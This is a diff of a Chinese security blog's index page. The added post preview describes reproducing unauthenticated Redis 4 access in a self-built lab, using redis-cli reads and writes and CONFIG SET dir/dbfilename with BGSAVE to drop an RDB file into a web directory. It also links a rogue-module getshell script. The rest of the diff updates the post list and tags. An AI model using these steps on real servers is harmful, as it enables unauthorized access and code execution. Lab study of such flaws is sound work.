@@ -151,6 +151,44 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2026/06/08/Redis4-unacc/" >Redis-unacc</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2026-06-08  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="1-复现"><a href="#1-复现" class="headerlink" title="1. 复现"></a>1. 复现</h1><p>基础指令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli -h 10.62.60.167 -p 8589   (自建靶场的ip与端口，默认是6397)</span><br><span class="line"></span><br><span class="line">ping -&gt; pong 说明存在未授权</span><br><span class="line"></span><br><span class="line">keys *  打印所有的key</span><br><span class="line">get mykey 测试读取</span><br><span class="line"><span class="built_in">set</span> test1_key <span class="string">&quot;This is test1_key&quot;</span> 测试写入</span><br><span class="line"></span><br><span class="line">info server 服务信息</span><br><span class="line">CONFIG GET <span class="built_in">dir</span> 查询工作目录，RDB 文件、AOF 日志文件都会保存在这个目录下</span><br><span class="line">CONFIG GET dbfilename 查询RDB快照文件名称（内存快照）</span><br><span class="line">CONFIG GET rdbcompression 查询RDB快照文件是否开启压缩</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Redis4-unacc/image_1.png" alt="Redis4-unacc·图1"><br>当前redis版本是4.0.14，是老版本了。 </p>
+<p>那就先做拉取数据库文件，然后本地解析</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BGSAVE 触发后台生成RDB快照，防止操作阻塞</span><br><span class="line">LASTSAVE 返回一个最新快照时间戳</span><br></pre></td></tr></table></figure>
+<p><img loading="lazy" decoding="async" src="/images/Redis4-unacc/image_2.png" alt="Redis4-unacc·图2"></p>
+<p>但是redis没有可供下载的地方，所以一般都是在线读信息，如果硬是要下载，就要寻在http文件下载端点，这个过程有点麻烦</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 备份原有配置（后面必须恢复！）</span></span><br><span class="line">CONFIG GET <span class="built_in">dir</span></span><br><span class="line">CONFIG GET dbfilename</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改保存目录（为下载端点目录）</span></span><br><span class="line">CONFIG SET <span class="built_in">dir</span> <span class="string">&quot;/var/www/html/....下载端点&quot;</span></span><br><span class="line">CONFIG SET dbfilename <span class="string">&quot;dump.rdb&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发快照，把rdb写入该目录</span></span><br><span class="line">BGSAVE</span><br></pre></td></tr></table></figure>
+
+
+<p>所以还是利用modle进行getshell吧，攻击脚本：：<a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell.git">https://github.com/vulhub/redis-rogue-getshell.git</a></p>
+	
+	</div>
+  <a type="button" href="/2026/06/08/Redis4-unacc/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2026/06/07/HookScripts/" >HookScripts</a>
 		</h3>
 		</div>
@@ -178,44 +216,6 @@
 	
 	</div>
   <a type="button" href="/2026/06/07/HookScripts/#more" class="btn btn-default more">阅读此文</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2026/04/20/邮箱地址解析/" >邮箱地址解析</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2026-04-20  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="从协议原理到实战攻破GitHub-GitLab——复刻PortSwigger研究思路"><a href="#从协议原理到实战攻破GitHub-GitLab——复刻PortSwigger研究思路" class="headerlink" title="从协议原理到实战攻破GitHub&#x2F;GitLab——复刻PortSwigger研究思路"></a>从协议原理到实战攻破GitHub&#x2F;GitLab——复刻PortSwigger研究思路</h1><p>本文完整保留<a target="_blank" rel="noopener" href="https://portswigger.net/research/splitting-the-email-atom">《Splitting the email atom》</a>原文研究逻辑、试错过程、Payload案例，融合邮箱解析库原理、规则差异、漏洞本质等精华内容，以零基础可懂的语言，还原安全研究者从发现异常→挖掘原理→绕过防护→实战攻破大厂的全流程，无核心知识点遗漏。</p>
-<hr>
-<h1 id="前言：颠覆对电子邮件地址的认知"><a href="#前言：颠覆对电子邮件地址的认知" class="headerlink" title="前言：颠覆对电子邮件地址的认知"></a>前言：颠覆对电子邮件地址的认知</h1><p>常规认知中，邮箱格式为<strong>本地部分@域名</strong>，系统仅做简单格式校验，但真实情况为：</p>
-<ol>
-<li>邮箱解析无统一标准，完全依赖解析库、邮件服务器的自定义规则；</li>
-<li>解析库为轻量级字符串处理，仅做基础匹配运算，不会消耗大量硬件资源；</li>
-<li>邮箱RFC协议为兼容老旧技术，保留大量冗余、宽松的解析规则；</li>
-<li>解析规则不统一+协议过度宽松+第三方库违规实现，催生了域名验证绕过、内网入侵、企业服务器控制等高危漏洞。</li>
-</ol>
-<p>本文将跟随研究者思考路径，从邮件路由异常切入，逐层揭开邮箱解析漏洞的完整体系。</p>
-<hr>
-<h1 id="第一章-基础铺垫：邮箱解析核心知识"><a href="#第一章-基础铺垫：邮箱解析核心知识" class="headerlink" title="第一章 基础铺垫：邮箱解析核心知识"></a>第一章 基础铺垫：邮箱解析核心知识</h1><h2 id="1-1-理论标准与现实解析差异"><a href="#1-1-理论标准与现实解析差异" class="headerlink" title="1.1 理论标准与现实解析差异"></a>1.1 理论标准与现实解析差异</h2>
-	
-	</div>
-  <a type="button" href="/2026/04/20/邮箱地址解析/#more" class="btn btn-default more">阅读此文</a>
 </div>
 
 		
@@ -317,48 +317,48 @@
 		<h4>标签云</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/网络层/">网络层<span>1</span></a></li>
+			<li><a href="/tags/Java/">Java<span>1</span></a></li>
 		
-			<li><a href="/tags/Docker/">Docker<span>1</span></a></li>
-		
-			<li><a href="/tags/SSH/">SSH<span>1</span></a></li>
-		
-			<li><a href="/tags/Linux/">Linux<span>1</span></a></li>
-		
-			<li><a href="/tags/栈/">栈<span>1</span></a></li>
-		
-			<li><a href="/tags/Git/">Git<span>1</span></a></li>
-		
-			<li><a href="/tags/计算机体系架构/">计算机体系架构<span>1</span></a></li>
-		
-			<li><a href="/tags/Mysql/">Mysql<span>1</span></a></li>
+			<li><a href="/tags/windows/">windows<span>1</span></a></li>
 		
 			<li><a href="/tags/应用层/">应用层<span>1</span></a></li>
 		
-			<li><a href="/tags/SQL注入/">SQL注入<span>1</span></a></li>
-		
-			<li><a href="/tags/同源策略/">同源策略<span>1</span></a></li>
-		
-			<li><a href="/tags/JWT/">JWT<span>1</span></a></li>
-		
-			<li><a href="/tags/指令/">指令<span>3</span></a></li>
-		
-			<li><a href="/tags/深度学习/">深度学习<span>2</span></a></li>
-		
-			<li><a href="/tags/代理/">代理<span>1</span></a></li>
-		
-			<li><a href="/tags/Nginx/">Nginx<span>1</span></a></li>
-		
-			<li><a href="/tags/js/">js<span>4</span></a></li>
-		
-			<li><a href="/tags/Pwn/">Pwn<span>3</span></a></li>
-		
-			<li><a href="/tags/DIV/">DIV<span>1</span></a></li>
+			<li><a href="/tags/传输层/">传输层<span>1</span></a></li>
 		
 			<li><a href="/tags/计算机网络/">计算机网络<span>7</span></a></li>
 		
+			<li><a href="/tags/crawlers/">crawlers<span>1</span></a></li>
 		
-		   <li><a href="/tags">...<span>68</span></a></li>
+			<li><a href="/tags/业务逻辑漏洞/">业务逻辑漏洞<span>1</span></a></li>
+		
+			<li><a href="/tags/内网/">内网<span>2</span></a></li>
+		
+			<li><a href="/tags/WEB/">WEB<span>1</span></a></li>
+		
+			<li><a href="/tags/Next/">Next<span>1</span></a></li>
+		
+			<li><a href="/tags/Redis/">Redis<span>1</span></a></li>
+		
+			<li><a href="/tags/服务器/">服务器<span>1</span></a></li>
+		
+			<li><a href="/tags/JWT/">JWT<span>1</span></a></li>
+		
+			<li><a href="/tags/红队/">红队<span>1</span></a></li>
+		
+			<li><a href="/tags/Pwn/">Pwn<span>3</span></a></li>
+		
+			<li><a href="/tags/Hexo/">Hexo<span>1</span></a></li>
+		
+			<li><a href="/tags/XSS/">XSS<span>1</span></a></li>
+		
+			<li><a href="/tags/同源策略/">同源策略<span>1</span></a></li>
+		
+			<li><a href="/tags/深度学习/">深度学习<span>2</span></a></li>
+		
+			<li><a href="/tags/Linux/">Linux<span>1</span></a></li>
+		
+		
+		   <li><a href="/tags">...<span>66</span></a></li>
 		 
 		</ul>
 	</div>
@@ -369,6 +369,10 @@
 <div class="widget">
   <h4>最新文章</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2026/11/16/VPN抗封锁/" ><i class="fa fa-file-o"></i>VPN抗封锁</a>
+      </li>
     
       <li>
         <a href="/2026/10/30/Java安全/" ><i class="fa fa-file-o"></i>Java安全</a>
@@ -384,10 +388,6 @@
     
       <li>
         <a href="/2026/10/09/BUUCTF-Misc/" ><i class="fa fa-file-o"></i>Misc合集</a>
-      </li>
-    
-      <li>
-        <a href="/2026/09/10/红队思路v1.0.0/" ><i class="fa fa-file-o"></i>红队思路v1.0.0</a>
       </li>
     
   </ul>
